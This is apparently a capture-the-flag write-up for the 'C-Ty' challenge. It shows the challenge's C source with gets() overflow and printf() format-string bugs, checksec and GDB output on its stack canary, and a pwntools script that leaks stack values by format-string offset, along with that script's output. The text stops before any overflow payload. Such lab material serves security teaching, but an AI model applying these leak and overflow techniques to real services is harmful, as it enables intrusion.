# Problem:
namp scan get the following:   
```
2500/tcp open     rtsserv?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, NULL: 
|_    Warning: this server only sends one line at a time. If you've opened a shell, this may lead to some weird shenanigans until you are able to get a proper shell with netcat.Welcome to the C-Ty! You notice a canary watching over these parts. But can you get past it with the right set of words? Input encoded in hex:
```   
Attached are two files: cty.c and cty (binary)

## Classic BOF with Canary problem
### Run the cty binary:   
```
kali@kali:~/ct-y$ ./cty
AAAAAAAAAAAAAAAAa
AAAAAAAAAAAAAAAAa
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
```    
### Analysis

The code is a simple c code:
``` 
#include <stdio.h>
#include <unistd.h>
#include <string.h>
 
void dumpFlag() {
    puts("The blue key to The Gate is '[key removed]'");
}
 
void runIntoTheCty() {
    puts("Running into the C-Ty...");
    char* args[] = {"/bin/sh", NULL};
    execv("/bin/sh", args);
}
 
int main() {
    char input[256];
    gets(input);
    printf(input);
    puts("");
    gets(input);
    printf(input);
    puts("");
}                      
```    
With pwn we can check the binary **cty**: it is a 64 bit ELF. As you can see, Canary protection is active.    
```
kali@kali:~/ct-y$ pwn checksec cty                                                                                
[*] '/home/kali/ct-y/cty'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
With GDB we can see in the main function, the canary is checked:    
```
   0x0000000000401256 <+125>:   call   0x401030 <puts@plt>
   0x000000000040125b <+130>:   mov    eax,0x0
   0x0000000000401260 <+135>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000401264 <+139>:   sub    rdx,QWORD PTR fs:0x28     //check canary. RDX is the register
   0x000000000040126d <+148>:   je     0x401274 <main+155>
   0x000000000040126f <+150>:   call   0x401040 <__stack_chk_fail@plt>

   ``` 
As soon as we see the c code, we see a format string in **printf()**, and an overflow buffer in **gets()**.    
### Leak the Canary
We do a python code to see possible outputs of **format strings**      
**%dlx** is used to print out address value

```
#!/usr/bin/env python3
from pwn import *

io = ELF("./cty")
for i in range(50):
  p = io.process(level="error")
  p.sendline("33")
  p.sendline("AAAA %%%d$lx" % i)
  p.recvline()
  print("%d - %s" % (i, p.recvline().strip()))
  p.close()
```
Output is:
```
kali@kali:~/ct-y$ python3 t1.py
[*] '/home/kali/ct-y/cty'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
0 - b'AAAA %0$lx'
1 - b'AAAA 6c24312520414141'
2 - b'AAAA 0'
3 - b'AAAA 7fee9f427980'
4 - b'AAAA 7fff84aba680'
5 - b'AAAA 0'
6 - b'AAAA 2436252041414141'
7 - b'AAAA 7f68d200786c'
8 - b'AAAA 0'
9 - b'AAAA 7ffe058d6790'
10 - b'AAAA 7f866c983730'
11 - b'AAAA 7fe96a5b4ac0'
12 - b'AAAA 0'
13 - b'AAAA 0'
14 - b'AAAA 0'
15 - b'AAAA 0'
16 - b'AAAA ffffffff'
17 - b'AAAA 0'
18 - b'AAAA 7ffc83d342a8'
19 - b'AAAA 7f1aa9e29730'
20 - b'AAAA 0'
21 - b'AAAA 0'
22 - b'AAAA 0'
23 - b'AAAA 0'
24 - b'AAAA 0'
25 - b'AAAA 0'
26 - b'AAAA 0'
27 - b'AAAA f0b5ff'
28 - b'AAAA c2'
29 - b'AAAA 7ffefe41cea7'
30 - b'AAAA 7ffd535a3946'
31 - b'AAAA 7f1a482769f5'
32 - b'AAAA 0'
33 - b'AAAA 4012cd'
34 - b'AAAA 0'
35 - b'AAAA 0'
36 - b'AAAA 401280'
37 - b'AAAA 401080'
38 - b'AAAA 7ffc4da218f0'
39 - b'AAAA 369bda5ddbf1bc00'
40 - b'AAAA 401280'
41 - b'AAAA 7fecf9ae4e0b'
42 - b'AAAA 0'
43 - b'AAAA 7ffe78103658'
44 - b'AAAA 100040000'
45 - b'AAAA 4011d9'
46 - b'AAAA 0'
47 - b'AAAA d2d22253bdd7b319'
48 - b'AAAA 401080'
49 - b'AAAA 7ffe0446bea0'
```

